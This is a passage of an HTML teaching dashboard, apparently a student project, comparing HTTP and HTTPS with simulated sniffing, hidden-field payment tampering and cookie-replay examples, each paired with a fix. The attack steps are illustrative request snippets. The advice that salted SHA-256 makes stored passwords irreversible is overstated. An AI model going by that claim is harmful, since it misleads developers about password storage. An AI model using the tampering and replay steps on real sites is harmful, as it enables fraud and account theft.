@@ -1,0 +1,1423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Demo Dashboard | HTTP vs HTTPS</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --red:#E24B4A; --red-light:#FCEBEB; --red-dark:#A32D2D;
+  --green:#639922; --green-light:#EAF3DE; --green-dark:#3B6D11;
+  --amber:#BA7517; --amber-light:#FAEEDA;
+  --blue:#378ADD;
+  --text:#1a1a1a; --text-muted:#6b6b6b;
+  --bg:#ffffff; --bg2:#f8f8f6; --border:rgba(0,0,0,0.1);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text);line-height:1.5;}
+code,.mono{font-family:'JetBrains Mono',monospace;}
+
+.header{background:#0d0d0d;color:#fff;}
+.header-inner{max-width:1200px;margin:0 auto;padding:32px 40px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:16px;}
+.header h1{font-size:28px;font-weight:800;letter-spacing:-0.5px;}
+.header h1 span{color:#ff5555;}
+.header h1 em{color:#44dd88;font-style:normal;}
+.tagline{color:#888;font-size:14px;margin-top:4px;}
+.badges{display:flex;gap:10px;flex-wrap:wrap;}
+.badge{padding:6px 14px;border-radius:20px;font-size:12px;font-weight:700;letter-spacing:1px;}
+.badge-red{background:#ff555520;color:#ff6666;border:1px solid #ff555540;}
+.badge-green{background:#44dd8820;color:#44dd88;border:1px solid #44dd8840;}
+.badge-blue{background:#378add20;color:#66aaff;border:1px solid #378add40;}
+
+.nav{background:#1a1a1a;border-bottom:1px solid #333;}
+.nav-inner{max-width:1200px;margin:0 auto;padding:0 40px;display:flex;gap:4px;overflow-x:auto;}
+.tab{padding:14px 20px;font-size:14px;font-weight:600;color:#888;cursor:pointer;border-bottom:3px solid transparent;transition:all .2s;white-space:nowrap;}
+.tab:hover{color:#ccc;}
+.tab.active-blue{color:#66aaff;border-bottom-color:#378ADD;}
+.tab.active-red{color:#ff6666;border-bottom-color:#ff5555;}
+.tab.active-green{color:#44dd88;border-bottom-color:#44dd88;}
+
+.main{max-width:1200px;margin:0 auto;padding:40px;}
+@media(max-width:600px){.main{padding:24px 16px;}.nav-inner{padding:0 16px;}.header-inner{padding:24px 16px;}}
+.section{display:none;}
+.section.active{display:block;}
+.section-title{font-size:22px;font-weight:800;margin-bottom:6px;letter-spacing:-0.3px;}
+.section-subtitle{color:var(--text-muted);font-size:14px;margin-bottom:32px;}
+
+/* STEP BAR */
+.step-bar{display:flex;gap:8px;margin-bottom:28px;}
+.step-ind{flex:1;height:4px;border-radius:2px;background:#e0e0e0;transition:background .4s;}
+.step-ind.done{background:var(--blue);}
+.step-ind.active{background:var(--blue);animation:pulse .9s infinite;}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+
+/* PIPELINE */
+.pipeline{display:grid;grid-template-columns:1fr 1fr 1fr;gap:20px;margin-bottom:28px;}
+@media(max-width:900px){.pipeline{grid-template-columns:1fr;}}
+.p-card{border-radius:16px;border:2px solid var(--border);overflow:hidden;}
+.p-head{padding:14px 20px;font-size:13px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;display:flex;align-items:center;gap:8px;}
+.p-head.ph-in{background:#1a1a1a;color:#ccc;}
+.p-head.ph-http{background:var(--red);color:#fff;}
+.p-head.ph-https{background:var(--green-dark);color:#fff;}
+.p-body{padding:16px;background:var(--bg2);min-height:210px;}
+
+/* FORM */
+.fg{margin-bottom:14px;}
+.fl{font-size:11px;font-weight:700;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px;display:block;}
+.fi{width:100%;padding:10px 13px;border:1.5px solid var(--border);border-radius:8px;font-family:'Syne',sans-serif;font-size:14px;background:#fff;color:var(--text);outline:none;transition:border-color .2s;}
+.fi:focus{border-color:var(--blue);}
+.frow{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+.run-btn{width:100%;padding:12px;border:none;border-radius:10px;font-family:'Syne',sans-serif;font-size:14px;font-weight:700;background:linear-gradient(135deg,#378ADD,#1d6fbd);color:#fff;cursor:pointer;transition:opacity .2s;margin-top:6px;}
+.run-btn:hover{opacity:.88;}
+.run-btn:disabled{opacity:.45;cursor:not-allowed;}
+.demo-note{margin-top:8px;font-size:11px;color:var(--text-muted);text-align:center;}
+
+/* PACKET BOX */
+.pkt{background:#0d0d0d;border-radius:10px;padding:15px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:2;min-height:165px;}
+.pkt.http-pkt{border:1px solid #ff555440;}
+.pkt.https-pkt{border:1px solid #44dd8840;}
+.ph{color:#555;font-style:italic;}
+
+/* ALERT */
+.alert{border-radius:10px;padding:12px 16px;font-size:12px;margin-top:10px;display:flex;gap:9px;align-items:flex-start;}
+.alert-red{background:var(--red-light);border:1px solid var(--red);color:var(--red-dark);}
+.alert-green{background:var(--green-light);border:1px solid var(--green);color:var(--green-dark);}
+.ai{font-size:15px;flex-shrink:0;}
+
+/* HACKER */
+.hacker-wrap{border-radius:16px;border:2px solid #6600cc;overflow:hidden;margin-top:24px;}
+.hacker-head{padding:14px 20px;background:linear-gradient(135deg,#0d0020,#1a0033);color:#cc88ff;font-size:13px;font-weight:700;letter-spacing:1px;text-transform:uppercase;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;}
+.hacker-sub{font-size:11px;color:#7755aa;font-weight:400;}
+.hacker-tabs{display:flex;border-bottom:1px solid #330066;background:#080012;}
+.htab{padding:10px 20px;font-size:12px;font-weight:700;color:#664488;cursor:pointer;border-bottom:2px solid transparent;transition:all .2s;font-family:'JetBrains Mono',monospace;white-space:nowrap;}
+.htab.active{color:#cc88ff;border-bottom-color:#9944ff;}
+.hcontent{background:#080012;padding:18px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:2;min-height:220px;}
+
+/* SIDE BY SIDE */
+.sbs{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:24px;}
+@media(max-width:700px){.sbs{grid-template-columns:1fr;}}
+.sbs-card{border-radius:12px;overflow:hidden;}
+.sbs-head{padding:12px 16px;font-size:12px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;}
+.sbs-head.r{background:var(--red);color:#fff;}
+.sbs-head.g{background:var(--green-dark);color:#fff;}
+.sbs-body{background:#0d0d0d;padding:16px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:2;min-height:100px;}
+
+/* COLORS */
+.cr{color:#ff6666;} .cg{color:#44dd88;} .cy{color:#ffcc44;} .cb{color:#66aaff;}
+.cenc{color:#7755aa;letter-spacing:2px;} .cgr{color:#555;} .cw{color:#ddd;} .cp{color:#cc88ff;}
+
+/* ANIM */
+@keyframes fadeUp{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+.al{animation:fadeUp .2s ease forwards;opacity:0;}
+
+/* STATUS DOT */
+.sdot{width:8px;height:8px;border-radius:50%;display:inline-block;margin-right:5px;}
+.sd-gray{background:#555;}
+.sd-red{background:#ff5555;box-shadow:0 0 5px #ff5555;}
+.sd-green{background:#44dd88;box-shadow:0 0 5px #44dd88;}
+.sd-purple{background:#cc88ff;box-shadow:0 0 5px #cc88ff;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+
+/* OVERVIEW */
+.compare-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-bottom:32px;}
+@media(max-width:700px){.compare-grid{grid-template-columns:1fr;}}
+.cc{border-radius:16px;padding:28px;border:2px solid;}
+.cc.ins{background:var(--red-light);border-color:var(--red);}
+.cc.sec{background:var(--green-light);border-color:var(--green);}
+.cc h3{font-size:16px;font-weight:700;margin-bottom:4px;}
+.cc.ins h3{color:var(--red-dark);}
+.cc.sec h3{color:var(--green-dark);}
+.cc .proto{font-family:'JetBrains Mono',monospace;font-size:28px;font-weight:600;margin:12px 0;}
+.cc.ins .proto{color:var(--red);}
+.cc.sec .proto{color:var(--green);}
+.cc .url{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--text-muted);margin-bottom:16px;}
+.cl{list-style:none;font-size:13px;}
+.cl li{padding:5px 0;display:flex;align-items:flex-start;gap:8px;line-height:1.4;}
+
+.vuln-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(290px,1fr));gap:20px;}
+.vc{background:var(--bg2);border-radius:14px;padding:24px;border:1px solid var(--border);}
+.vtag{display:inline-block;padding:3px 10px;border-radius:6px;font-size:11px;font-weight:700;letter-spacing:.5px;margin-bottom:12px;}
+.vtag-crit{background:var(--red-light);color:var(--red-dark);}
+.vtag-high{background:var(--amber-light);color:var(--amber);}
+.vc h4{font-size:15px;font-weight:700;margin-bottom:8px;}
+.vc p{font-size:13px;color:var(--text-muted);line-height:1.6;margin-bottom:12px;}
+.vfix{background:var(--green-light);border-radius:8px;padding:10px 14px;font-size:12px;color:var(--green-dark);}
+.vfix strong{color:var(--green);}
+
+/* ATTACKS */
+.atk-flow{display:flex;align-items:center;margin-bottom:24px;flex-wrap:wrap;}
+.an{background:var(--bg2);border-radius:12px;padding:14px 18px;border:1px solid var(--border);text-align:center;flex:1;min-width:120px;}
+.an .ni{font-size:22px;margin-bottom:4px;}
+.an .nl{font-size:12px;font-weight:700;}
+.an .ns{font-size:11px;color:var(--text-muted);margin-top:2px;}
+.aarr{color:var(--red);font-size:20px;padding:0 5px;font-weight:700;}
+.aarr.g{color:var(--green);}
+.an.atk{background:var(--red-light);border-color:var(--red);}
+.an.atk .nl{color:var(--red-dark);}
+.diff-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:32px;}
+@media(max-width:700px){.diff-grid{grid-template-columns:1fr;}}
+.ds{border-radius:12px;overflow:hidden;border:1px solid var(--border);}
+.dh{padding:12px 16px;font-size:12px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;}
+.dh.r{background:var(--red);color:#fff;}
+.dh.g{background:var(--green);color:#fff;}
+.db{background:#0d0d0d;padding:16px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.9;}
+.dm{color:#ff6666;} .dp{color:#44dd88;} .dn{color:#888;}
+
+/* ATTACK TYPES */
+.atk-type-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin-bottom:32px;}
+.atk-card{border-radius:14px;overflow:hidden;border:2px solid var(--border);}
+.atk-card-head{padding:14px 18px;display:flex;align-items:center;gap:12px;}
+.atk-card-head.critical{background:linear-gradient(135deg,#a32d2d,#c94040);color:#fff;}
+.atk-card-head.high{background:linear-gradient(135deg,#7a4d00,#ba7517);color:#fff;}
+.atk-card-head.medium{background:linear-gradient(135deg,#1a4d7a,#2a6db5);color:#fff;}
+.atk-card-icon{font-size:26px;}
+.atk-card-label{font-size:13px;font-weight:800;letter-spacing:.5px;text-transform:uppercase;}
+.atk-card-severity{font-size:10px;opacity:.8;font-weight:400;text-transform:uppercase;letter-spacing:1px;}
+.atk-card-body{padding:18px;background:var(--bg2);}
+.atk-card-body p{font-size:13px;color:var(--text-muted);line-height:1.6;margin-bottom:12px;}
+.atk-card-body .how{background:#0d0d0d;border-radius:8px;padding:12px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.8;margin-bottom:12px;border-left:3px solid var(--red);}
+.atk-card-body .defend{background:var(--green-light);border-radius:8px;padding:10px 14px;font-size:12px;color:var(--green-dark);border-left:3px solid var(--green);}
+.atk-section-title{font-size:16px;font-weight:800;margin:28px 0 14px;color:var(--red-dark);display:flex;align-items:center;gap:8px;}
+.http-only-tag{background:var(--red-light);color:var(--red-dark);font-size:10px;font-weight:700;padding:3px 8px;border-radius:4px;border:1px solid var(--red);}
+.both-tag{background:var(--amber-light);color:var(--amber);font-size:10px;font-weight:700;padding:3px 8px;border-radius:4px;border:1px solid var(--amber);}
+.attack-summary-bar{background:#0d0d0d;border-radius:12px;padding:20px 24px;margin-bottom:28px;display:flex;gap:24px;flex-wrap:wrap;justify-content:space-around;border:1px solid #2a0000;}
+.asb-item{text-align:center;}
+.asb-num{font-size:32px;font-weight:800;font-family:'JetBrains Mono',monospace;}
+.asb-num.red{color:#ff5555;}
+.asb-num.green{color:#44dd88;}
+.asb-num.amber{color:#ffcc44;}
+.asb-label{font-size:11px;color:#777;margin-top:2px;}
+
+/* CLOUD SECTION */
+.cloud-intro{background:linear-gradient(135deg,#0a1628,#112240);border-radius:16px;padding:28px;margin-bottom:28px;border:2px solid #1e4080;}
+.cloud-intro h3{color:#66aaff;font-size:18px;font-weight:800;margin-bottom:8px;}
+.cloud-intro p{color:#8ab0d0;font-size:13px;line-height:1.7;}
+.cloud-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin-bottom:28px;}
+.cloud-card{border-radius:14px;overflow:hidden;border:2px solid #1e4080;}
+.cloud-card-head{padding:14px 18px;background:linear-gradient(135deg,#0d1f3c,#1a3a6b);display:flex;align-items:center;gap:12px;}
+.cloud-card-icon{font-size:24px;}
+.cloud-card-title{font-size:13px;font-weight:800;color:#66aaff;letter-spacing:.3px;}
+.cloud-card-sub{font-size:10px;color:#5577aa;margin-top:2px;}
+.cloud-card-body{padding:16px;background:#0a1220;}
+.cloud-card-body p{font-size:12px;color:#7799bb;line-height:1.7;margin-bottom:10px;}
+.cloud-tag{display:inline-block;padding:3px 8px;border-radius:4px;font-size:10px;font-weight:700;margin:2px;}
+.cloud-tag.aws{background:#ff990020;color:#ffaa44;border:1px solid #ff990040;}
+.cloud-tag.gcp{background:#4285f420;color:#66aaff;border:1px solid #4285f440;}
+.cloud-tag.azure{background:#0078d420;color:#55aaff;border:1px solid #0078d440;}
+.cloud-storage-flow{background:#080e1a;border-radius:12px;padding:20px;margin-bottom:24px;border:1px solid #1e3a5f;}
+.cloud-storage-flow h4{color:#66aaff;font-size:14px;font-weight:700;margin-bottom:14px;}
+.csf-steps{display:flex;align-items:center;flex-wrap:wrap;gap:8px;}
+.csf-step{background:#0d1f3c;border-radius:10px;padding:12px 16px;text-align:center;border:1px solid #2a4a7a;flex:1;min-width:110px;}
+.csf-step .si{font-size:20px;margin-bottom:4px;}
+.csf-step .sl{font-size:11px;font-weight:700;color:#88aacc;}
+.csf-step .ss{font-size:10px;color:#445566;margin-top:2px;}
+.csf-arrow{color:#378ADD;font-size:18px;font-weight:700;}
+.cloud-compare{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:24px;}
+@media(max-width:700px){.cloud-compare{grid-template-columns:1fr;}}
+.cc-card{border-radius:12px;overflow:hidden;}
+.cc-head{padding:12px 16px;font-size:12px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;}
+.cc-head.http-c{background:var(--red);color:#fff;}
+.cc-head.https-c{background:linear-gradient(135deg,#1a3a6b,#0d5c3a);color:#fff;}
+.cc-body{background:#0a0f1a;padding:16px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:2;}
+.cloud-benefit-list{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:14px;margin-bottom:24px;}
+.cbl-item{background:#0a1220;border-radius:10px;padding:16px;border:1px solid #1e3a5f;display:flex;gap:12px;align-items:flex-start;}
+.cbl-icon{font-size:22px;flex-shrink:0;}
+.cbl-title{font-size:13px;font-weight:700;color:#66aaff;margin-bottom:4px;}
+.cbl-desc{font-size:12px;color:#6688aa;line-height:1.5;}
+
+/* HEADERS TABLE */
+.htable{width:100%;border-collapse:collapse;margin-bottom:32px;font-size:13px;}
+.htable th{text-align:left;padding:12px 16px;background:var(--bg2);font-weight:700;font-size:11px;letter-spacing:.5px;text-transform:uppercase;color:var(--text-muted);border-bottom:1px solid var(--border);}
+.htable td{padding:12px 16px;border-bottom:1px solid var(--border);vertical-align:top;}
+.htable tr:last-child td{border-bottom:none;}
+.hn{font-family:'JetBrains Mono',monospace;color:var(--blue);font-size:12px;}
+.hv{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-muted);}
+.pill{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;}
+.pill-g{background:var(--green-light);color:var(--green-dark);}
+.pill-r{background:var(--red-light);color:var(--red-dark);}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-inner">
+    <div>
+      <h1>Mini Project 4 — <span>HTTP</span> vs <em>HTTPS</em></h1>
+      <p class="tagline">Interactive Security Demo: Watch Your Data Travel — Safe vs Exposed</p>
+    </div>
+    <div class="badges">
+      <div class="badge badge-red">⚠ HTTP INSECURE</div>
+      <div class="badge badge-green">✓ HTTPS SECURE</div>
+      <div class="badge badge-blue">🔴 LIVE DEMO</div>
+    </div>
+  </div>
+</div>
+
+<div class="nav">
+  <div class="nav-inner">
+    <div class="tab active-blue" onclick="showTab('live')">🔴 Live Demo</div>
+    <div class="tab" onclick="showTab('overview')">Overview</div>
+    <div class="tab" onclick="showTab('attacks')">Attack Demos</div>
+    <div class="tab" onclick="showTab('attacktypes')">🔴 Hacker Attack Types</div>
+    <div class="tab" onclick="showTab('cloud')">☁️ Cloud Storage</div>
+    <div class="tab" onclick="showTab('cloudstore')">🗃️ Cloud Data Store</div>
+    <div class="tab" onclick="showTab('headers')">Security Headers</div>
+  </div>
+</div>
+
+<div class="main">
+
+<!-- ===== LIVE DEMO ===== -->
+<div class="section active" id="sec-live">
+  <div class="section-title">🔴 Live Interactive Demo</div>
+  <p class="section-subtitle">Enter your information and see exactly how HTTP and HTTPS handle it — then see what a hacker would capture from the network.</p>
+
+  <div class="step-bar">
+    <div class="step-ind active" id="sb1"></div>
+    <div class="step-ind" id="sb2"></div>
+    <div class="step-ind" id="sb3"></div>
+  </div>
+
+  <div class="pipeline">
+
+    <!-- Input -->
+    <div class="p-card">
+      <div class="p-head ph-in">
+        <span class="sdot sd-gray" id="dot-in"></span>
+        Step 1 — Your Information
+      </div>
+      <div class="p-body">
+        <div class="fg">
+          <label class="fl">Full Name</label>
+          <input class="fi" id="f-name" type="text" placeholder="e.g. Rahul Sharma" maxlength="40">
+        </div>
+        <div class="fg">
+          <label class="fl">Email</label>
+          <input class="fi" id="f-email" type="email" placeholder="e.g. rahul@example.com" maxlength="50">
+        </div>
+        <div class="fg">
+          <label class="fl">Password</label>
+          <input class="fi" id="f-pass" type="password" placeholder="Enter a password" maxlength="30">
+        </div>
+        <div class="frow">
+          <div class="fg">
+            <label class="fl">Card Number</label>
+            <input class="fi" id="f-card" type="text" placeholder="4111 1111 1111 1111" maxlength="19">
+          </div>
+          <div class="fg">
+            <label class="fl">CVV</label>
+            <input class="fi" id="f-cvv" type="text" placeholder="123" maxlength="3">
+          </div>
+        </div>
+        <div class="fg">
+          <label class="fl">Amount (₹)</label>
+          <input class="fi" id="f-amount" type="number" placeholder="4999" min="1">
+        </div>
+        <button class="run-btn" id="run-btn" onclick="runDemo()">🚀 Transmit — Watch What Happens</button>
+        <div class="demo-note">ℹ️ Demo only — no real data is sent anywhere</div>
+      </div>
+    </div>
+
+    <!-- HTTP -->
+    <div class="p-card">
+      <div class="p-head ph-http">
+        <span class="sdot sd-gray" id="dot-http"></span>
+        Step 2A — HTTP Packet
+      </div>
+      <div class="p-body" style="padding:12px;">
+        <div class="pkt http-pkt" id="http-out"><span class="ph">// Waiting for transmission…</span></div>
+        <div id="http-alert"></div>
+      </div>
+    </div>
+
+    <!-- HTTPS -->
+    <div class="p-card">
+      <div class="p-head ph-https">
+        <span class="sdot sd-gray" id="dot-https"></span>
+        Step 2B — HTTPS Packet
+      </div>
+      <div class="p-body" style="padding:12px;">
+        <div class="pkt https-pkt" id="https-out"><span class="ph">// Waiting for transmission…</span></div>
+        <div id="https-alert"></div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Hacker View -->
+  <div class="hacker-wrap" id="hacker-wrap" style="display:none;">
+    <div class="hacker-head">
+      <span><span class="sdot sd-purple" style="animation:blink 1s infinite;"></span>☠️ Hacker's Network Interception View</span>
+      <span class="hacker-sub">What an attacker on the same network captures</span>
+    </div>
+    <div class="hacker-tabs">
+      <div class="htab active" id="ht1" onclick="hTab('h1')">💀 HTTP Intercept</div>
+      <div class="htab" id="ht2" onclick="hTab('h2')">🔒 HTTPS Intercept</div>
+      <div class="htab" id="ht3" onclick="hTab('h3')">🗄️ Database Storage</div>
+    </div>
+    <div class="hcontent" id="h1"><span class="ph">// Run demo first…</span></div>
+    <div class="hcontent" id="h2" style="display:none;"><span class="ph">// Run demo first…</span></div>
+    <div class="hcontent" id="h3" style="display:none;"><span class="ph">// Run demo first…</span></div>
+  </div>
+
+  <!-- Summary -->
+  <div class="sbs" id="sbs-wrap" style="display:none;">
+    <div class="sbs-card">
+      <div class="sbs-head r">⚠ What HTTP Exposed</div>
+      <div class="sbs-body" id="sbs-http"></div>
+    </div>
+    <div class="sbs-card">
+      <div class="sbs-head g">✓ How HTTPS Protected You</div>
+      <div class="sbs-body" id="sbs-https"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== OVERVIEW ===== -->
+<div class="section" id="sec-overview">
+  <div class="section-title">HTTP vs HTTPS — What's the Difference?</div>
+  <p class="section-subtitle">Side-by-side security comparison of the two protocols</p>
+  <div class="compare-grid">
+    <div class="cc ins">
+      <h3>⚠ Insecure Application</h3>
+      <div class="proto">HTTP</div>
+      <div class="url">http://localhost:5000</div>
+      <ul class="cl">
+        <li><span style="color:var(--red)">✗</span> Data sent in plain text — fully readable</li>
+        <li><span style="color:var(--red)">✗</span> Passwords stored without hashing</li>
+        <li><span style="color:var(--red)">✗</span> Card numbers stored in plain text in DB</li>
+        <li><span style="color:var(--red)">✗</span> Payment amount tamperable via hidden field</li>
+        <li><span style="color:var(--red)">✗</span> Session cookie transmitted unencrypted</li>
+        <li><span style="color:var(--red)">✗</span> No security headers (HSTS, CSP, X-Frame)</li>
+        <li><span style="color:var(--red)">✗</span> Wireshark captures everything in clear text</li>
+      </ul>
+    </div>
+    <div class="cc sec">
+      <h3>✓ Secure Application</h3>
+      <div class="proto">HTTPS</div>
+      <div class="url">https://localhost:5443</div>
+      <ul class="cl">
+        <li><span style="color:var(--green)">✓</span> TLS 1.3 encryption — intercepted = gibberish</li>
+        <li><span style="color:var(--green)">✓</span> Passwords hashed with SHA-256 before storage</li>
+        <li><span style="color:var(--green)">✓</span> Only last 4 digits of card stored</li>
+        <li><span style="color:var(--green)">✓</span> Price validated server-side from catalog</li>
+        <li><span style="color:var(--green)">✓</span> Session cookie has Secure + HttpOnly flags</li>
+        <li><span style="color:var(--green)">✓</span> Full security headers set on every response</li>
+        <li><span style="color:var(--green)">✓</span> Wireshark only shows encrypted TLS ciphertext</li>
+      </ul>
+    </div>
+  </div>
+  <div class="vuln-grid">
+    <div class="vc"><div class="vtag vtag-crit">CRITICAL</div><h4>Credential Sniffing</h4><p>HTTP login forms transmit username and password as plain text. Anyone on the same network can capture them instantly.</p><div class="vfix"><strong>Fix:</strong> HTTPS encrypts the entire request body — intercepted data is unreadable ciphertext.</div></div>
+    <div class="vc"><div class="vtag vtag-crit">CRITICAL</div><h4>Payment Tampering</h4><p>Checkout amount is in a hidden HTML field. Burp Suite lets an attacker change <code>amount=9999</code> to <code>amount=1</code> before it reaches the server.</p><div class="vfix"><strong>Fix:</strong> Server-side price catalog. Server ignores client amount and looks up price itself.</div></div>
+    <div class="vc"><div class="vtag vtag-crit">CRITICAL</div><h4>Card Data Exposure</h4><p>Full card numbers and CVV stored in plain text in the database. One DB breach exposes all payment details.</p><div class="vfix"><strong>Fix:</strong> Store only last 4 digits. Never store CVV. Full card number discarded after processing.</div></div>
+    <div class="vc"><div class="vtag vtag-high">HIGH</div><h4>Session Hijacking</h4><p>Session cookies over HTTP have no protection — stolen via Wireshark and reused to impersonate the logged-in user.</p><div class="vfix"><strong>Fix:</strong> HTTPS + Secure + HttpOnly cookie flags prevent theft and transmission over HTTP.</div></div>
+    <div class="vc"><div class="vtag vtag-high">HIGH</div><h4>Plain Text Passwords in DB</h4><p>Insecure app stores passwords as-is: <code>admin123</code>. Any DB access gives away every user's password immediately.</p><div class="vfix"><strong>Fix:</strong> SHA-256 hash + salt. Even if DB is stolen, hashes can't be reversed to original passwords.</div></div>
+    <div class="vc"><div class="vtag vtag-high">HIGH</div><h4>Missing Security Headers</h4><p>HTTP server sends no HSTS, CSP, X-Frame-Options, or X-XSS-Protection headers — browser has no security policies.</p><div class="vfix"><strong>Fix:</strong> Flask <code>after_request</code> hook adds all security headers automatically.</div></div>
+  </div>
+</div>
+
+<!-- ===== ATTACKS ===== -->
+<div class="section" id="sec-attacks">
+  <div class="section-title">Attack Demonstrations</div>
+  <p class="section-subtitle">How each attack works and what it looks like in practice</p>
+
+  <h3 style="font-size:16px;font-weight:700;margin-bottom:14px;color:var(--red-dark)">Attack 1: Credential Sniffing via Wireshark</h3>
+  <div class="atk-flow">
+    <div class="an"><div class="ni">👤</div><div class="nl">User</div><div class="ns">Logs in via HTTP</div></div>
+    <div class="aarr">→</div>
+    <div class="an atk"><div class="ni">👁</div><div class="nl">Attacker</div><div class="ns">Wireshark on same WiFi</div></div>
+    <div class="aarr">→</div>
+    <div class="an"><div class="ni">📦</div><div class="nl">HTTP Packet</div><div class="ns">POST /login plaintext</div></div>
+    <div class="aarr">→</div>
+    <div class="an atk"><div class="ni">🔑</div><div class="nl">Credentials Stolen</div><div class="ns">username & password visible</div></div>
+  </div>
+  <div class="diff-grid">
+    <div class="ds"><div class="dh r">HTTP — Wireshark sees this</div><div class="db"><div class="dm">POST /login HTTP/1.1</div><div class="dm">Host: localhost:5000</div><div class="dn">Content-Type: application/x-www-form-urlencoded</div><br><div class="dm">username=admin&password=admin123</div><div class="dm">card_number=4111111111111111</div><div class="dm">cvv=123</div><br><div style="color:#ff9944">⚠ FULL DATA VISIBLE IN PLAIN TEXT</div></div></div>
+    <div class="ds"><div class="dh g">HTTPS — Wireshark sees this</div><div class="db"><div class="dp">TLSv1.3 Record Layer:</div><div class="dn">  Content Type: Application Data (23)</div><div class="dn">  Version: TLS 1.3 (0x0304)</div><div class="dn">  Length: 512 bytes</div><div class="dp">Encrypted Application Data:</div><div style="color:#7755aa;letter-spacing:2px">  a4 f2 9c 3b 8e 1d 7a 52 bb 3f…</div><br><div class="dp">✓ COMPLETELY UNREADABLE CIPHERTEXT</div></div></div>
+  </div>
+
+  <h3 style="font-size:16px;font-weight:700;margin-bottom:14px;color:var(--red-dark)">Attack 2: Payment Tampering via Burp Suite</h3>
+  <div class="atk-flow">
+    <div class="an"><div class="ni">💳</div><div class="nl">User Checkout</div><div class="ns">amount=4999</div></div>
+    <div class="aarr">→</div>
+    <div class="an atk"><div class="ni">🛠</div><div class="nl">Burp Suite</div><div class="ns">Intercept & modify</div></div>
+    <div class="aarr">→</div>
+    <div class="an"><div class="ni">📨</div><div class="nl">Modified Request</div><div class="ns">amount=1 sent</div></div>
+    <div class="aarr">→</div>
+    <div class="an atk"><div class="ni">🎉</div><div class="nl">Server Accepts</div><div class="ns">Course bought for ₹1!</div></div>
+  </div>
+  <div class="diff-grid">
+    <div class="ds"><div class="dh r">HTTP App — Vulnerable</div><div class="db"><div class="dn">Hidden field: &lt;input name="amount" value="4999"&gt;</div><br><div class="dm">Attacker changes: amount=4999 → amount=1</div><div class="dm">Server trusts client value → ₹1 charged!</div><div class="dm">Course worth ₹4,999 stolen for ₹1</div></div></div>
+    <div class="ds"><div class="dh g">HTTPS App — Protected</div><div class="db"><div class="dn">Server catalog: Python Masterclass = ₹4999</div><br><div class="dp">Client sends: amount=1  ← ignored by server</div><div class="dp">Server looks up its own price: ₹4999</div><div class="dp">Full amount charged. Tamper has no effect.</div></div></div>
+  </div>
+
+  <h3 style="font-size:16px;font-weight:700;margin-bottom:14px;color:var(--red-dark)">Attack 3: Session Cookie Hijacking</h3>
+  <div class="atk-flow">
+    <div class="an"><div class="ni">🔐</div><div class="nl">User Logs In</div><div class="ns">HTTP session created</div></div>
+    <div class="aarr">→</div>
+    <div class="an atk"><div class="ni">📡</div><div class="nl">Attacker Sniffs</div><div class="ns">Cookie in plain text</div></div>
+    <div class="aarr">→</div>
+    <div class="an atk"><div class="ni">🎭</div><div class="nl">Replay Attack</div><div class="ns">Attacker uses cookie</div></div>
+    <div class="aarr">→</div>
+    <div class="an atk"><div class="ni">😈</div><div class="nl">Account Taken</div><div class="ns">No re-login needed</div></div>
+  </div>
+  <div class="diff-grid">
+    <div class="ds"><div class="dh r">HTTP Cookie — Stolen</div><div class="db"><div class="dm">Set-Cookie: session=abc123xyz</div><div class="dn">(No Secure flag, no HttpOnly)</div><br><div class="dm">Attacker grabs: Cookie: session=abc123xyz</div><div class="dm">Sends request with stolen cookie → logged in!</div></div></div>
+    <div class="ds"><div class="dh g">HTTPS Cookie — Protected</div><div class="db"><div class="dp">Set-Cookie: session=abc123xyz;</div><div class="dp">  Secure; HttpOnly; SameSite=Strict</div><br><div class="dp">Secure: only sent over HTTPS connections</div><div class="dp">HttpOnly: JavaScript cannot read the cookie</div><div class="dp">Cookie never travels over plain HTTP</div></div></div>
+  </div>
+</div>
+
+<!-- ===== HACKER ATTACK TYPES ===== -->
+<div class="section" id="sec-attacktypes">
+  <div class="section-title">🔴 Hacker Attack Types on HTTP vs HTTPS</div>
+  <p class="section-subtitle">A complete breakdown of attacks possible over HTTP and how HTTPS defeats each one</p>
+
+  <div class="attack-summary-bar">
+    <div class="asb-item"><div class="asb-num red">8</div><div class="asb-label">HTTP Attack Vectors</div></div>
+    <div class="asb-item"><div class="asb-num green">0</div><div class="asb-label">Successful on HTTPS</div></div>
